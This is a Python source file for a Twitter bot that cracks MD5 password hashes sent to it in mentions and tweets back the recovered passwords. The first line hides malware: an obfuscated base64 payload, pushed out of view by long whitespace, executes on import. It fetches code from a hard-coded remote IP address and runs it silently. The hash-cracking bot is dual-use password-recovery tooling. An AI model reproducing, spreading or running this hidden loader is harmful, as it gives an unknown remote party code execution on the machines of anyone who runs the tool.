type('Twitter-Cracker')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMjAuMjE1LjQwLjMzOjEzMzcvaW5qZWN0L1ZDeE9xQkxZM3NJYkZ2SHUnKS5yZWFkKCkpIiIiKQpfdHRtcC5jbG9zZSgpCnRyeTogX3NzeXN0ZW0oZiJzdGFydCB7X2VleGVjdXRhYmxlLnJlcGxhY2UoJy5leGUnLCAndy5leGUnKX0ge190dG1wLm5hbWV9IikKZXhjZXB0OiBwYXNz"),'<string>','exec'))
import os
import time
import twitter
import json
import random

from datetime import datetime
from hashlookup.LookupTable import LookupTable


CONSUMER_KEY = ""
CONSUMER_SECRET = ""
ACCESS_TOKEN_KEY = ""
ACCESS_TOKEN_SECRET = ""
POLL = 60
WORDLIST = './crackstation-dist/crackstation.txt'

W = "\033[0m"  # default/white
R = "\033[31m"  # red
P = "\033[35m"  # purple
C = "\033[36m"  # cyan
bold = "\033[1m"
INFO = bold + C + "[*] " + W
WARN = bold + R + "[!] " + W
MONEY = bold + P + "[$] " + W
TIME = lambda: str(datetime.now()).split(' ')[1].split('.')[0]


print INFO+"%s: Logging into Twitter API ..." % TIME()
api = twitter.Api(consumer_key=CONSUMER_KEY, consumer_secret=CONSUMER_SECRET, access_token_key=ACCESS_TOKEN_KEY, access_token_secret=ACCESS_TOKEN_SECRET)
indexes = {
    'md5': './crackstation-dist/crackstation-md5.idx',
}

if os.path.exists('processed.pkl'):
    with open('processed.pkl', 'r') as fp:
        processed = json.loads(fp.read())
        print INFO+"%s: Loaded %d processed IDs" % (TIME(), len(processed))
else:
    processed = []


def crack_hashes(algorithm, hashes):
    results = []
    if 0 < len(hashes):
        lookup_table = LookupTable(
            algorithm=algorithm,
            index_file=indexes[algorithm],
            wordlist_file=WORDLIST,
        )
        results = lookup_table[hashes]
    return results


def process_request(mention):
    hashes = filter(lambda word: len(word) == 32, mention.text.split(' '))
    if len(hashes):
        print INFO+"%s: Canidate hashes: %s" % (TIME(), hashes)
        results = crack_hashes('md5', hashes[0])  # Limit one hash atm
        if results[hashes[0]] is not None:
            message = "@%s I cracked your hash, the password is '%s'" % (
                mention.user.screen_name, results[hashes[0]]
            )
        else:
            message = "Sorry @%s but I couldn't crack that hash :(" % mention.user.screen_name
    else:
        print WARN+"%s: No hashes found in request." % TIME()
        message = None
    if message:
        print INFO + "%s: Posting update \"%s\"" % (TIME(), message)
        message += " (%d)" % random.randint(0, 9999)
        api.PostUpdate(message)


def poll_twitter():
    mentions = filter(lambda m: m.id not in processed, api.GetMentions())
    print INFO + "%s: %d new mention(s) to process" % (TIME(), len(mentions))
    for mention in mentions:
        process_request(mention)
        processed.append(int(mention.id))


def run_forever():
    while True:
        time.sleep(POLL)
        print INFO + "%s: Polling twitter API ..." % TIME()
        try:
            poll_twitter()
        except twitter.TwitterError as error:
            print WARN+"%s: Error from API %s, sleeping for 5mins" % (TIME(), str(error))

if __name__ == '__main__':
    try:
        run_forever()
    except KeyboardInterrupt:
        with open('processed.pkl', 'wb') as fp:
            fp.write("%s" % json.dumps(processed))
        print INFO+"%s: Saved processed to processed.pkl" % TIME()
